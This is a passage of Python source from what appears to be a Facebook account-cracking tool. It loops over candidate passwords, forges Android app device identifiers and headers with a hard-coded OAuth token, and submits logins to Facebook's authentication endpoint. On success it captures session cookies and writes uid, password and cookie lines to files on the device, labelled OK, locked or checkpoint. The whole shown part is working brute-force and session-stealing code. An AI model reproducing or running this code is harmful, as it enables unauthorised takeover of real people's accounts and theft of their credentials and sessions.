        try:
            for pw in self.plist:
                with requests.Session() as session:
                    pas = self.pwmanager(ids,pw)
                    ua = tanim()
                    data={
                    "adid": str(uuid.uuid4()).upper(),
                    "device_id": str(uuid.uuid4()).upper(),
                    "family_device_id": str(uuid.uuid4()).upper(),
                    "secure_family_device_id": str(uuid.uuid4()).upper(),
                    "logged_out_id": str(uuid.uuid4()),
                    "hash_id": str(uuid.uuid4()),
                    "reg_instance": str(uuid.uuid4()),
                    "session_id": str(uuid.uuid4()),
                    "advertiser_id": str(uuid.uuid4()),
                    "format": "json",
                    "email": ids,
                    "password": pas,
                    "generate_analytics_claims": "1",
                    "credentials_type": "password",
                    "source": "login",
                    "sim_country": "id",
                    "network_country": "id",
                    "relative_url": "method/auth.login",
                    "error_detail_type": "button_with_disabled",
                    "enroll_misauth": "false",
                    "generate_session_cookies": "1",
                    "generate_machine_id": "1",
                    "locale": "en_US",
                    "client_country_code": "US",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"
                    }
                    header={
                    "Host": "b-graph.facebook.com",
                    "User-Agent": ua,
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                    "X-FB-Connection-Type": "unknown",
                    "X-FB-Connection-Bandwidth": str(random.randint(20000000, 50000000)),
                    "X-FB-Net-HNI": str(random.randint(30000, 40000)),
                    "X-FB-SIM-HNI": str(random.randint(30000, 40000)),
                    "X-FB-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                    "X-FB-device-group": str(random.randint(3500, 3600)),
                    "X-FB-Friendly-Name": "authenticate",
                    "X-FB-Request-Analytics-Tags": "graphservice",
                    "X-FB-connection-quality": "EXCELLENT",
                    "X-Tigon-Is-Retry": "False",
                    "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-FB-Client-IP": "True",
                    "X-FB-Server-Cluster": "True",
                    "X-FB-HTTP-Engine": "Liger"
                    }
                    url = "https://b-graph.facebook.com/auth/login"
                    po = session.post(url,data=data,headers=header).text
                    q = json.loads(po)
                    if 'session_key' in q:
                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                        uid=str(q['uid'])
                        if self.check_lock(uid) == True:
                            if "no" in self.cok:
                                print(f"\r\r {G}[OK] {uid} | {pas} ")
                            else:
                                print('\r\r\033[38;5;46m [PORN-OK] '+ids+' | '+pas)
                                fuck = random.choice(seexy)
                                print(f"\x1b[38;5;46m [\x1b[38;5;46mCOOKIE🍪\x1b[38;5;46m] = {fuck}{coki}")
                                open("/sdcard/PORN-M5-Ok.txt","a").write(uid+"|"+pas+"|"+coki+"\n")                               
                            self.oks.append(uid)
                            break
                        elif self.check_lock(uid) == False:
                            print(f"\r\r {Y}[PORN-LK] {uid} | {pas} ")
                            open("/sdcard/PORN-M5-Lk.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                            break
                    elif 'www.facebook.com' in q['error']['message']:
                        print('\r\r\033[38;5;196m [PORN-CP] '+ids+' | '+pas)
                        open("/sdcard/PORN-M5-Cp.txt","a").write(ids+"|"+pas+"\n")
                        self.cps.append(ids)
                        break
                    else:
                        continue
            self.loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
            self.rE(ids)
        except Exception as e:
            pass

RANDOM()